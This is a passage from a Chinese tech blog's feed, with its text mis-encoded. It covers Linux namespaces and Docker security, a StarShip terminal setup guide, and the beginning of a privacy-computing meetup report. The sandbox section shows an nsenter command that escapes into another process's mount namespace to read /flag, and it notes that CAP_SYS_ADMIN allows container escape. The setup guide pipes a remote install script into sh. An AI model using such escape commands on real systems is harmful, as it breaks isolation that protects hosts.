æŒ‡å‘<code>/proc/pid/ns/</code>ç›®å½•ä¸­çš„ä¸€ä¸ªé“¾æ¥ï¼ˆæˆ–ç»‘å®šæŒ‚è½½åˆ°æ­¤ç±»é“¾æ¥ï¼‰çš„æ–‡ä»¶æè¿°ç¬¦ï¼›</p><p>â€¢  ä¸€ä¸ªè¿›ç¨‹æ–‡ä»¶çš„å¥æŸ„</p><p><code>nstype</code>è§†æƒ…å†µè€Œå®šã€‚</p><p><code>setns()</code>ç³»ç»Ÿè°ƒç”¨å¯ä»¥å°†å½“å‰è¿›ç¨‹çš„å‘½åç©ºé—´åˆ‡æ¢æˆå…¶ä»–è¿›ç¨‹çš„å‘½åç©ºé—´ã€‚</p><p>åœ¨bashä¸­ï¼Œå¯ä»¥ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PID=149</span><br><span class="line">nsenter --mount=/proc/<span class="variable">$PID</span>/ns/mnt <span class="built_in">cat</span> /flag</span><br></pre></td></tr></tbody></table></figure><p>è¿™æ ·å½“å‰bashå°±ä¼šæ‹¥æœ‰å’ŒPIDä¸º149çš„è¿›ç¨‹ä¸€æ ·çš„æŒ‚è½½å‘½åç©ºé—´ã€‚å‡å¦‚è¿™ä¸ªè¿›ç¨‹æ˜¯æ²™ç®±å¤–çš„ï¼Œé‚£ä¹ˆå½“å‰bashå°±æœ‰äº†æ²™ç®±å¤–çš„æŒ‚è½½å‘½åç©ºé—´ï¼Œæ„å‘³ç€æ²™ç®±å†…ç”¨æˆ·å¯ä»¥è®¿é—®å®Œæ•´çš„æ–‡ä»¶æ ‘ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå°†åŸæœ‰çš„<code>/proc</code>æŒ‚è½½åˆ°æ²™ç®±ä¸­ï¼Œä¸”æ²™ç®±å¤–æœ‰å…¶ä»–è¿›ç¨‹æœªå…³é—­çš„æƒ…å†µä¸‹ï¼Œæ˜¯éå¸¸å±é™©çš„ï¼</p><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="Dockerå®¹å™¨-vs-æ²™ç®±"><a href="#Dockerå®¹å™¨-vs-æ²™ç®±" class="headerlink" title="Dockerå®¹å™¨ vs æ²™ç®±"></a>Dockerå®¹å™¨ vs æ²™ç®±</h3><p>Dockerå®¹å™¨å’Œæ²™ç®±æœ‰è®¸å¤šç›¸ä¼¼ä¹‹å¤„ï¼Œä¾‹å¦‚ï¼š</p><ul><li><p>ç¯å¢ƒéš”ç¦»</p><p>ä¸¤è€…éƒ½ä¸å®¿ä¸»ç³»ç»Ÿäº§ç”Ÿäº†ä¸€å®šçš„éš”ç¦»ï¼Œèµ·åˆ°äº†é™åˆ¶å’Œä¿æŠ¤ä½œç”¨</p></li><li><p>è½»é‡</p><p>ç›¸æ¯”äºè™šæ‹Ÿæœºï¼Œä¸¤è€…éƒ½ç§°å¾—ä¸Šè½»é‡</p></li></ul><p>ä½†ä¸¤è€…æ˜¯æˆªç„¶ä¸åŒçš„æŠ€æœ¯ï¼š</p><ul><li><p>éš”ç¦»çº§åˆ«ï¼š</p><p>Dockerå®¹å™¨æä¾›äº†ä¸€ç§ç›¸å¯¹è¾ƒé«˜çº§åˆ«çš„éš”ç¦»ï¼ŒåŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿéš”ç¦»ã€è¿›ç¨‹éš”ç¦»ã€ç½‘ç»œéš”ç¦»ç­‰ã€‚å®¹å™¨ä¹‹é—´é€šå¸¸æ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œä½†å®ƒä»¬ä»ç„¶åœ¨åŒä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸ä¸Šè¿è¡Œã€‚æ²™ç®±é€šå¸¸æä¾›æ›´åŠ ç»†ç²’åº¦çš„éš”ç¦»ï¼Œé€šå¸¸æ˜¯ä¸ºäº†é™åˆ¶å•ä¸ªåº”ç”¨ç¨‹åºæˆ–ä»£ç çš„æƒé™ã€‚æ²™ç®±ç¯å¢ƒå¯ä»¥æ˜¯å•è¿›ç¨‹çš„ï¼Œä¸æ¶‰åŠå¤šä¸ªå®¹å™¨æˆ–åº”ç”¨ç¨‹åºçš„ååŒå·¥ä½œã€‚</p></li><li><p>ç”¨é€”ï¼š</p><p>Dockerå®¹å™¨æ˜¯ç”¨äºæ„å»ºã€æ‰“åŒ…å’Œè¿è¡Œåº”ç”¨ç¨‹åºçš„ç‹¬ç«‹ã€å¯ç§»æ¤çš„ç¯å¢ƒã€‚å®ƒä»¬æ—¨åœ¨åœ¨ä¸åŒçš„ç¯å¢ƒä¸­ä¸€è‡´åœ°è¿è¡Œåº”ç”¨ç¨‹åºï¼ŒåŒ…æ‹¬å¼€å‘ã€æµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒã€‚Dockerå®¹å™¨é€šå¸¸åŒ…æ‹¬åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–é¡¹ï¼Œå¹¶æä¾›äº†éš”ç¦»ã€ç‰ˆæœ¬æ§åˆ¶å’Œè‡ªåŠ¨åŒ–éƒ¨ç½²çš„èƒ½åŠ›ã€‚æ²™ç®±æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºéš”ç¦»å’Œé™åˆ¶è¿è¡Œåœ¨å…¶ä¸­çš„ä»£ç æˆ–ç¨‹åºçš„èƒ½åŠ›ã€‚æ²™ç®±æ—¨åœ¨æä¾›ä¸€ç§å—é™åˆ¶çš„æ‰§è¡Œç¯å¢ƒï¼Œä»¥é˜²æ­¢åº”ç”¨ç¨‹åºæˆ–ä»£ç å¯¹ç³»ç»Ÿæˆ–å…¶ä»–åº”ç”¨ç¨‹åºé€ æˆæŸå®³ã€‚å®ƒé€šå¸¸ç”¨äºæ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç æˆ–å¯¹åº”ç”¨ç¨‹åºè¿›è¡Œæµ‹è¯•ï¼Œä»¥å‡å°‘æ½œåœ¨çš„é£é™©ã€‚</p></li><li><p>éš”ç¦»æŠ€æœ¯ï¼š</p><p>Dockerå®¹å™¨ä½¿ç”¨å®¹å™¨åŒ–æŠ€æœ¯ï¼Œå¦‚Dockerå¼•æ“ï¼Œé€šè¿‡Linuxå‘½åç©ºé—´ã€æ§åˆ¶ç»„ç­‰æŠ€æœ¯æä¾›éš”ç¦»å’Œèµ„æºç®¡ç†ã€‚æ²™ç®±å¯ä»¥ä½¿ç”¨å„ç§æŠ€æœ¯ï¼ŒåŒ…æ‹¬æ“ä½œç³»ç»Ÿçº§åˆ«çš„è™šæ‹ŸåŒ–ã€chrootã€Seccompã€AppArmorç­‰ï¼Œå…·ä½“å–å†³äºå®ç°ã€‚</p></li></ul><h3 id="Dockerå®‰å…¨"><a href="#Dockerå®‰å…¨" class="headerlink" title="Dockerå®‰å…¨"></a>Dockerå®‰å…¨</h3><p>é™¤äº†åœ¨æ²™ç®±æŠ€æœ¯ä¸­æåˆ°çš„namespace, seccompç­‰ï¼ŒDockerè¿˜ä½¿ç”¨capabilities, control groupsç­‰æ¥Linuxæä¾›çš„åŠŸèƒ½æ¥æå‡å®‰å…¨æ€§ã€‚</p><ol><li>cgroupsï¼š<ul><li>èµ„æºéš”ç¦»ï¼šDockerä½¿ç”¨ cgroups æ¥éš”ç¦»å®¹å™¨çš„èµ„æºä½¿ç”¨ï¼ŒåŒ…æ‹¬CPUã€å†…å­˜ã€ç£ç›˜I/Oç­‰ã€‚æ¯ä¸ªå®¹å™¨éƒ½å¯ä»¥åˆ†é…ä¸€å®šçš„èµ„æºé…é¢ï¼Œä»¥ç¡®ä¿å®ƒä»¬ä¸ä¼šäº’ç›¸å¹²æ‰°æˆ–æŠ¢å ä¸»æœºä¸Šçš„èµ„æºã€‚</li><li>èµ„æºé™åˆ¶ï¼šcgroups å…è®¸è®¾ç½®å®¹å™¨çš„èµ„æºé™åˆ¶ï¼Œä¾‹å¦‚é™åˆ¶ CPU ä½¿ç”¨ç‡ã€å†…å­˜ä½¿ç”¨é‡ç­‰ã€‚è¿™æœ‰åŠ©äºé˜²æ­¢å®¹å™¨æ»¥ç”¨ä¸»æœºä¸Šçš„èµ„æºï¼Œæé«˜æ•´ä¸ªç³»ç»Ÿçš„ç¨³å®šæ€§ã€‚</li><li>èµ„æºç›‘æ§ï¼šé€šè¿‡ cgroupsï¼Œä½ å¯ä»¥ç›‘è§†å®¹å™¨çš„èµ„æºä½¿ç”¨æƒ…å†µï¼Œä»¥ä¾¿è¿›è¡Œæ€§èƒ½è°ƒæ•´å’Œèµ„æºè§„åˆ’ã€‚</li></ul></li><li>capabilitiesï¼š<ul><li>æœ€å°æƒé™åŸåˆ™ï¼šDocker ä½¿ç”¨ Linux çš„ capabilities åŠŸèƒ½æ¥ç¡®ä¿å®¹å™¨ä¸­çš„è¿›ç¨‹ä»¥æœ€å°æƒé™åŸåˆ™è¿è¡Œã€‚capabilities å…è®¸æˆ‘ä»¬å°†æƒé™åˆ†é…ç»™è¿›ç¨‹ï¼Œè€Œä¸éœ€è¦å®Œå…¨çš„ root æƒé™ã€‚è¿™æ ·å¯ä»¥å‡å°æ½œåœ¨çš„æ”»å‡»é¢ã€‚</li><li>é™ä½ç‰¹æƒï¼šDocker é»˜è®¤æƒ…å†µä¸‹ä¼šå‰¥å¤ºå®¹å™¨ä¸­çš„è¿›ç¨‹ä¸€äº›æ•æ„Ÿçš„æƒé™ï¼Œå¦‚ä¿®æ”¹ä¸»æœºçš„ç½‘ç»œé…ç½®æˆ–è®¿é—®ä¸»æœºçš„è®¾å¤‡ã€‚è¿™æœ‰åŠ©äºé™ä½å®¹å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹å¯¹ä¸»æœºçš„æ½œåœ¨å¨èƒã€‚</li></ul></li></ol><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœä¸»æœº <code>/proc</code> ç›®å½•è¢«æŒ‚è½½åœ¨ docker å®¹å™¨ä¸­ï¼Œè€Œä¸”å®¹å™¨çš„<code>capabilities</code>é…ç½®äº† <code>CAP_SYS_ADMIN</code> ï¼ˆå¾ˆé«˜çš„æƒé™ï¼Œä¾‹å¦‚å¯ä»¥æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½å¤Ÿå¾ˆè½»æ¾çš„ä»å®¹å™¨ä¸­é€ƒé€¸ã€‚</p>]]></content>
    
    
    <summary type="html">ä¸€ç¯‡æ‚è°ˆï¼Œä»æ²™ç®±èŠåˆ°Dockerã€‚</summary>
    
    
    
    <category term="ç³»ç»Ÿå®‰å…¨" scheme="https://blog.beacox.space/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="æ²™ç®±" scheme="https://blog.beacox.space/tags/%E6%B2%99%E7%AE%B1/"/>
    
    <category term="æ²™ç®±é€ƒé€¸" scheme="https://blog.beacox.space/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
    <category term="Docker" scheme="https://blog.beacox.space/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>ç»ˆç«¯è‡ªå®šä¹‰â€”â€”StarShip</title>
    <link href="https://blog.beacox.space/posts/shell-customize/"/>
    <id>https://blog.beacox.space/posts/shell-customize/</id>
    <published>2023-07-29T11:04:50.000Z</published>
    <updated>2023-07-29T11:04:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€ä¸ªå¥½çœ‹ä¸”å¥½ç”¨çš„ç»ˆç«¯<del>æˆ–è®¸</del>æ˜¯ç”Ÿäº§åŠ›çš„ä¿éšœã€‚ä¹‹å‰æŠ˜è…¾ç»ˆç«¯çš„æ—¶å€™ä¹Ÿè¯•äº†å¾ˆå¤šæ–¹æ³•ï¼Œæ¯”å¦‚æ¢æˆzshã€fishç­‰ï¼Œè¿˜æœ‰å®é€‚ç”¨äºbashçš„OhMySHé¡¹ç›®ï¼ˆä¸æ˜¯zshï¼‰â€¦â€¦å…¶å®éƒ½æŒºä¸é”™çš„ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜â€”â€”é€Ÿåº¦æ¯”ä¸åŠ ä»»ä½•æ’ä»¶çš„bashæ…¢ä¸€äº›ã€‚æœºç¼˜å·§åˆä¸‹ï¼Œå‘ç°äº†StarShipé¡¹ç›®ï¼Œé€Ÿåº¦æ˜¾ç„¶æ›´å¿«ï¼Œå› æ­¤æ’°å†™æ­¤æ–‡åˆ†äº«ã€è®°å½•ã€‚Ubuntu + bashç”¨æˆ·å¯ä»¥å®Œå…¨å‚ç…§æ­¤æ–‡ã€‚<span id="more"></span></p><p>å…ˆè´´å‡ºæˆ‘çš„ç»ˆç«¯ï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/07/29/64c4ffaa041d6.png" data-fancybox="default" data-caption="shell"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/07/29/64c4ffaa041d6.png" class="lazyload" data-srcset="https://bu.dusays.com/2023/07/29/64c4ffaa041d6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="shell"></a><span class="image-caption">shell</span></div></div><h2 id="StarShipä»‹ç»"><a href="#StarShipä»‹ç»" class="headerlink" title="StarShipä»‹ç»"></a>StarShipä»‹ç»</h2><p>StarShipæ˜¯ä¸€ä¸ªRustå†™çš„ç»ˆç«¯æç¤ºç¬¦å·¥å…·ï¼Œå¯åŠ¨é€Ÿåº¦å¾ˆå¿«ã€‚å®˜æ–¹çš„ä»‹ç»å¦‚ä¸‹ï¼š</p><blockquote><p><strong>è½»é‡ã€è¿…é€Ÿã€å¯æ— é™å®šåˆ¶çš„é«˜é¢œå€¼ç»ˆç«¯ï¼</strong></p><ul><li><strong>å¿«ï¼š</strong> å¾ˆå¿« â€”â€” çœŸçš„çœŸçš„éå¸¸å¿«ï¼ ğŸš€</li><li><strong>å®šåˆ¶åŒ–ï¼š</strong> å¯å®šåˆ¶å„ç§å„æ ·çš„æç¤ºç¬¦ã€‚</li><li><strong>é€šç”¨ï¼š</strong> é€‚ç”¨äºä»»ä½• Shellã€ä»»ä½•æ“ä½œç³»ç»Ÿã€‚</li><li><strong>æ™ºèƒ½ï¼š</strong> ä¸€ç›®äº†ç„¶åœ°æ˜¾ç¤ºç›¸å…³ä¿¡æ¯ã€‚</li><li><strong>åŠŸèƒ½ä¸°å¯Œï¼š</strong> æ”¯æŒæ‰€æœ‰ä½ å–œæ¬¢çš„å·¥å…·ã€‚</li><li><strong>æ˜“ç”¨ï¼š</strong> å®‰è£…å¿«é€Ÿ â€”â€” å‡ åˆ†é’Ÿå°±å¯ä¸Šæ‰‹ã€‚</li></ul></blockquote><p>å› æ­¤æˆ‘ä¸ç”¨å®‰è£…å…¶ä»–ç»ˆç«¯å°±å¯ä»¥ç”¨ï¼Œè€Œä¸”å®æµ‹å‡ ä¹æ²¡æœ‰æ„Ÿå—åˆ°æ‹–æ…¢bashå¯åŠ¨é€Ÿåº¦ã€‚</p><h2 id="å®‰è£…å¹¶å¯ç”¨å­—ä½“"><a href="#å®‰è£…å¹¶å¯ç”¨å­—ä½“" class="headerlink" title="å®‰è£…å¹¶å¯ç”¨å­—ä½“"></a>å®‰è£…å¹¶å¯ç”¨å­—ä½“</h2><p>ä½¿ç”¨StarShipçš„å‰ç½®è¦æ±‚æ˜¯ï¼šå®‰è£…å¹¶åœ¨ç»ˆç«¯å¯ç”¨ <a href="https://www.nerdfonts.com/">Nerd Font </a>å­—ä½“ï¼Œå¦‚ Fira Code Nerd Fontã€‚</p><p>è¿™é‡Œå°±ä»¥Fira Code Nerd Fontã€ubuntu22.04ä¸ºä¾‹ã€‚</p><h3 id="å®‰è£…å­—ä½“"><a href="#å®‰è£…å­—ä½“" class="headerlink" title="å®‰è£…å­—ä½“"></a>å®‰è£…å­—ä½“</h3><div class="btns rounded center grid1">            <a class="button" href="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.0.2/FiraCode.zip" title="ä¸‹è½½å­—ä½“"><i class="fas fa-download"></i>ä¸‹è½½å­—ä½“</a>          </div><p>ä¸‹è½½å¹¶è§£å‹å®Œæˆåï¼Œé€‰æ‹©ä¸€ç§æˆ–è€…å‡ ç§ï¼ŒåŒå‡»åç‚¹å‡»å³ä¸Šè§’çš„install/å®‰è£…ï¼Œå³å¯å®‰è£…å­—ä½“ã€‚</p><h3 id="å¯ç”¨å­—ä½“"><a href="#å¯ç”¨å­—ä½“" class="headerlink" title="å¯ç”¨å­—ä½“"></a>å¯ç”¨å­—ä½“</h3><p>æ¥ä¸‹æ¥éœ€è¦åœ¨ç»ˆç«¯å¯ç”¨å­—ä½“ï¼š</p><ol><li>ç‚¹å‡»å³ä¸Šè§’çš„èœå•ï¼ˆä¸‰æ ¹æ¨ªçº¿ï¼‰</li><li>ç‚¹å‡»Preferences</li><li>ç‚¹å‡»Unnamed</li><li>å‹¾é€‰å¯ç”¨Custom font</li><li>ç‚¹å‡»æ—è¾¹çš„é€‰é¡¹å¡ï¼Œæœç´¢Nerdï¼Œé€‰æ‹©ä¸€ä¸ªåŒ…å«<code>Nerd Font</code>çš„å­—ä½“</li></ol><p>é€‰æ‹©å®Œæˆåï¼Œç«‹å³ç”Ÿæ•ˆã€‚</p><h2 id="å®‰è£…StarShip"><a href="#å®‰è£…StarShip" class="headerlink" title="å®‰è£…StarShip"></a>å®‰è£…StarShip</h2><p>ä»¥Linuxä¸ºä¾‹ï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sS https://starship.rs/install.sh | sh</span><br></pre></td></tr></tbody></table></figure><p>å…¶ä»–æ“ä½œç³»ç»Ÿå¯å‚ç…§<a href="https://starship.rs/zh-CN/guide/#%E6%AD%A5%E9%AA%A4-1-%E5%AE%89%E8%A3%85-starship">å®˜æ–¹æ–‡æ¡£</a></p><h2 id="å¯ç”¨StarShip"><a href="#å¯ç”¨StarShip" class="headerlink" title="å¯ç”¨StarShip"></a>å¯ç”¨StarShip</h2><p>ä»¥bashä¸ºä¾‹ï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open ~/.bashrc</span><br></pre></td></tr></tbody></table></figure><p>åœ¨æœ«å°¾æ·»åŠ ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval "$(starship init bash)"</span><br></pre></td></tr></tbody></table></figure><p>åœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></tbody></table></figure><p>å…¶ä»–ç»ˆç«¯ï¼Œå¦‚cmdã€zshç­‰å¯ä»¥å‚ç…§<a href="https://starship.rs/zh-CN/guide/#%E6%AD%A5%E9%AA%A4-2-set-up-your-shell-to-use-starship">å®˜æ–¹æ–‡æ¡£</a></p><h2 id="æå‡é¢œå€¼"><a href="#æå‡é¢œå€¼" class="headerlink" title="æå‡é¢œå€¼"></a>æå‡é¢œå€¼</h2><p>StarShipå¯ä»¥è‡ªè¡Œå®šåˆ¶æ ·å¼ï¼Œå¯ä»¥å‚ç…§<a href="https://starship.rs/zh-CN/config/">å®˜æ–¹æ–‡æ¡£</a></p><p>å¯¹äºç»å¤§å¤šæ•°ç”¨æˆ·æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨ç¤¾åŒºæä¾›çš„é¢„è®¾ï¼š<a href="https://starship.rs/zh-CN/presets/">ç¤¾åŒºé…ç½®åˆ†äº«</a></p><p>æˆ‘ä½¿ç”¨çš„æ˜¯<a href="https://starship.rs/zh-CN/presets/#tokyo-night">Tokyo Night</a>é¢„è®¾ï¼Œä½†æ˜¯åšäº†ç¨è®¸ä¿®æ”¹ï¼š</p><ol><li>å°†Appleå›¾æ ‡æ”¹æˆLinux</li><li>æ·»åŠ ç”¨æˆ·åçš„æ˜¾ç¤º</li></ol><p>å¦‚æœæƒ³ç›´æ¥ä½¿ç”¨Tokyo Nighté¢„è®¾ï¼Œå¯ä»¥åœ¨ç»ˆç«¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">starship preset tokyo-night -o ~/.config/starship.toml</span><br></pre></td></tr></tbody></table></figure><ul><li><p>å¦‚æœæƒ³åœ¨æ­¤åŸºç¡€ä¸Šå°†Appleå›¾æ ‡æ”¹æˆLinuxï¼š</p><p>å‰å¾€<a href="https://www.nerdfonts.com/cheat-sheet">Nerd Fontså®˜ç½‘</a>ï¼Œæœç´¢<code>https://www.nerdfonts.com/cheat-sheet</code>ï¼Œå¤åˆ¶iconã€‚</p><p>åœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open ~/.config/starship.toml</span><br></pre></td></tr></tbody></table></figure><p>å°†ç¬¬ä¸‰è¡Œçš„Appleå›¾æ ‡æ›¿æ¢ä¸ºåˆšåˆšå¤åˆ¶çš„Linuxå›¾æ ‡ï¼Œä¿å­˜å¹¶é€€å‡º</p></li><li><p>å¦‚æœæƒ³åœ¨æ­¤åŸºç¡€ä¸Šæ·»åŠ ç”¨æˆ·åçš„æ˜¾ç¤ºï¼š</p><p>åœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open ~/.config/starship.toml</span><br></pre></td></tr></tbody></table></figure><p>åœ¨ç¬¬ä¸‰è¡Œåæ–°å»ºä¸€è¡Œï¼š</p><figure class="highlight toml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$username\</span><br></pre></td></tr></tbody></table></figure><p>åœ¨<code>[directory]</code>ä¸€è¡Œä¹‹å‰æ·»åŠ ï¼š</p><figure class="highlight toml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[username]</span></span><br><span class="line"><span class="attr">show_always</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">style_user</span> = <span class="string">"bg:#a3aed2 fg:#090c0c"</span></span><br><span class="line"><span class="attr">style_root</span> = <span class="string">"bg:#a3aed2 fg:#9A348E"</span></span><br><span class="line"><span class="attr">format</span> = <span class="string">'[$user ]($style)'</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸€ä¸ªå¥½çœ‹ä¸”å¥½ç”¨çš„ç»ˆç«¯&lt;del&gt;æˆ–è®¸&lt;/del&gt;æ˜¯ç”Ÿäº§åŠ›çš„ä¿éšœã€‚ä¹‹å‰æŠ˜è…¾ç»ˆç«¯çš„æ—¶å€™ä¹Ÿè¯•äº†å¾ˆå¤šæ–¹æ³•ï¼Œæ¯”å¦‚æ¢æˆzshã€fishç­‰ï¼Œè¿˜æœ‰å®é€‚ç”¨äºbashçš„OhMySHé¡¹ç›®ï¼ˆä¸æ˜¯zshï¼‰â€¦â€¦å…¶å®éƒ½æŒºä¸é”™çš„ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜â€”â€”é€Ÿåº¦æ¯”ä¸åŠ ä»»ä½•æ’ä»¶çš„bashæ…¢ä¸€äº›ã€‚æœºç¼˜å·§åˆä¸‹ï¼Œå‘ç°äº†StarShipé¡¹ç›®ï¼Œé€Ÿåº¦æ˜¾ç„¶æ›´å¿«ï¼Œå› æ­¤æ’°å†™æ­¤æ–‡åˆ†äº«ã€è®°å½•ã€‚Ubuntu + bashç”¨æˆ·å¯ä»¥å®Œå…¨å‚ç…§æ­¤æ–‡ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="è½¯ä»¶" scheme="https://blog.beacox.space/categories/%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="shell" scheme="https://blog.beacox.space/tags/shell/"/>
    
    <category term="ç¾åŒ–" scheme="https://blog.beacox.space/tags/%E7%BE%8E%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>éšè¯­å¼€æºMeetupä¸€å‘¨å¹´ä¸“åœºä¸ä¼šè®°å½•</title>
    <link href="https://blog.beacox.space/posts/secretflow-1st-meetup/"/>
    <id>https://blog.beacox.space/posts/secretflow-1st-meetup/</id>
    <published>2023-07-22T11:30:47.000Z</published>
    <updated>2023-07-22T11:30:47.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.secretflow.org.cn/">éšè¯­</a>æ˜¯ç”±èš‚èšé›†å›¢ç‰µå¤´æˆç«‹çš„å¼€æºéšç§è®¡ç®—æ¡†æ¶ï¼Œä»Šå¤©æ˜¯éšè¯­å¼€æºä¸€å‘¨å¹´çš„çº¿ä¸‹äº¤æµæ´»åŠ¨ã€‚è¯´æ¥æƒ­æ„§ï¼Œæˆ‘ä»æœªç»™éšè¯­è´¡çŒ®è¿‡ä¸€è¡Œä»£ç ã€‚æˆ–è€…æ›´å…·ä½“ç‚¹è¯´ï¼Œæˆ‘åœ¨ä¸€å‘¨å¹´Meetupä¸¾è¡Œå‰å‡ å¤©æ‰ä»å…¶ä»–å…¬ä¼—å·äº†è§£åˆ°è¿™ä¸ªæ¡†æ¶ã€‚ä½†æ˜¯æœ¬ç€äº†è§£å‰æ²¿æŠ€æœ¯ä¸æ¡†æ¶ã€å‘å›½å†…å¤§ä½¬å­¦ä¹ <del>ï¼ˆç¦»å¾—è¿˜ç®—è¿‘ï¼Œä½•ä¸ç™½å«–è›‹ç³•ğŸ‚å’Œå‘¨è¾¹ï¼‰</del>çš„æƒ³æ³•ï¼Œæˆ‘è¿˜æ˜¯æŠ¥åå‚åŠ äº†æ­¤æ¬¡äº¤æµä¼šã€‚</p><h2 id="ä»€ä¹ˆæ˜¯éšç§è®¡ç®—ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯éšç§è®¡ç®—ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯éšç§è®¡ç®—ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯éšç§è®¡ç®—ï¼Ÿ</h2><p>éšè¯­ç©¶ç«Ÿæ˜¯åšä»€ä¹ˆçš„ï¼Ÿè¦å›ç­”è¿™ä¸ªé—®é¢˜é¦–å…ˆè¦çŸ¥é“ä»€ä¹ˆæ˜¯éšç§è®¡ç®—ã€‚éšç§è®¡ç®—çš„æ ¸å¿ƒç‰¹å¾æ˜¯ï¼šå¯ç”¨ä¸å¯è§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘è¦æ ¹æ®ä¸€äº›æ•°æ®å¾—åˆ°ä¸€äº›ç»“æœï¼ŒæŒ‰ç…§ä¼ ç»Ÿæ–¹æ³•ï¼Œæˆ‘éœ€è¦çŸ¥é“è¿™äº›æ•°æ®å…·ä½“çš„å†…å®¹ï¼Œä½†æ˜¯åˆ©ç”¨éšç§è®¡ç®—æŠ€æœ¯ï¼Œæˆ‘åœ¨ä¸çŸ¥é“è¿™äº›æ•°æ®çš„å…·ä½“å†…å®¹çš„æƒ…å†µä¸‹ï¼Œä»ç„¶å¯ä»¥å¾—åˆ°ç»“æœã€‚ä¸¾ä¸ªå®é™…çš„ä½¿ç”¨åœºæ™¯æ¥è¯´ï¼šåŒ»ç–—ä¿é™©å…¬å¸æƒ³è¦è·å–æŠ•ä¿è€…çš„è¿‡å¾€ç—…å²ã€ä½é™¢è®°å½•ç­‰ä¿¡æ¯ï¼Œäºæ˜¯å‘åŒ»é™¢ç´¢è¦è¿™äº›ä¿¡æ¯ï¼Œä½†æ˜¯åŒ»é™¢ä¸ºäº†ä¿æŠ¤æ‚£è€…éšç§ã€é˜²æ­¢æ‚£è€…éšç§è¢«æ³„éœ²ï¼Œä¸æ„¿æ„å°†è¿™äº›æ•°æ®å…¨éƒ¨äº¤ç»™åŒ»ç–—ä¿é™©å…¬å¸ï¼Œè¿™æ—¶å€™åŒ»ç–—ä¿é™©å…¬å¸æ‰‹ä¸­æŠ•ä¿è€…çš„æ•°æ®å’ŒåŒ»é™¢æ‰‹ä¸­æ‚£è€…çš„æ•°æ®å°±éƒ½å½¢æˆäº†æ•°æ®å­¤å²›ï¼Œè¿™äº›æ•°æ®çš„éƒ¨åˆ†ä»·å€¼æ— æ³•å‘æŒ¥ã€‚æ—¢è¦ä¿éšœéšç§ã€åˆè¦å‘æŒ¥è¿™äº›æ•°æ®çš„ä»·å€¼ï¼Œå°±éœ€è¦ç”¨åˆ°éšç§è®¡ç®—æŠ€æœ¯ï¼Œæ¯”å¦‚ï¼ŒåŒ»é™¢å°†åŠ 